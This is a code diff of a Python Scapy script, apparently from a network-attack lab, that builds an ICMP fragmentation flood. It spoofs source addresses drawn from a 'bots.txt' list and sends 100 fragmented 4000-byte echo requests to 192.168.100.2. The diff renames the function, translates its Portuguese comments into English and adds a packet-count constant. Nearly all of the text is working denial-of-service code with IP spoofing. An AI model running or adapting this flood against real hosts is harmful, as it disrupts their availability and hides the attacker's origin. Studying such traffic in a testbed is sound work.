@@ -3,8 +3,10 @@ import random
 import time
 import ipaddress
 
+# ICMP Real Frag
 TARGET_IP = "192.168.100.2"
-BOTFILE = "bots.txt"
+BOTFILE = "../bots.txt"
+NUM_PACKETS = 100
 
 def load_bots(filename):
     bot_ips = []
@@ -16,28 +18,28 @@ def load_bots(filename):
                 bot_ips.append(ip)
     return bot_ips
 
-def run_icmp_flood_attack():
+def run_icmp_real_frag():
     bot_ips = load_bots(BOTFILE)
     lista_de_pacotes = []
     numero_de_pacotes_enviados = 0
 
-    # Define um payload grande para forçar a fragmentação (por exemplo, 4000 bytes)
+    # Big payload (4000 bytes), force frag
     icmp_payload = b"A" * 4000
 
     while True:
         source_ip = random.choice(bot_ips)
         ip_layer = IP(src=source_ip, dst=TARGET_IP)
         eth_layer = Ether()
-        icmp_layer = ICMP(type=8, code=0) / icmp_payload  # Echo Request com payload grande
+        icmp_layer = ICMP(type=8, code=0) / icmp_payload  # Echo Request with big payload
         packet = ip_layer / icmp_layer
-        # Fragmenta o pacote IP (isso retorna uma lista de fragmentos)
-        fragments = fragment(packet, fragsize=1480)  # MTU típica menos cabeçalhos
+        # Frag
+        fragments = fragment(packet, fragsize=1480)  # Typical MTU, -headers
         for frag in fragments:
             lista_de_pacotes.append(eth_layer / frag)
             numero_de_pacotes_enviados += 1
-            if numero_de_pacotes_enviados == 100:
+            if numero_de_pacotes_enviados == NUM_PACKETS:
                 break
-        if numero_de_pacotes_enviados == 100:
+        if numero_de_pacotes_enviados == NUM_PACKETS:
             break
 
     start_time = time.perf_counter()
@@ -45,10 +47,10 @@ def run_icmp_flood_attack():
     end_time = time.perf_counter()
     duration = end_time - start_time
 
-    print(f"\nEnvio concluído.")
-    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")
+    print(f"\nSending completed.")
+    print(f"Total time to send packets: {duration:.4f} seconds")
 
 if __name__ == "__main__":
-    run_icmp_flood_attack()
+    run_icmp_real_frag()
 
-# sudo PYTHONPATH=$HOME/scapy python3 icmp_frag.py
+# sudo PYTHONPATH=$HOME/scapy python3 icmp_real_frag.py
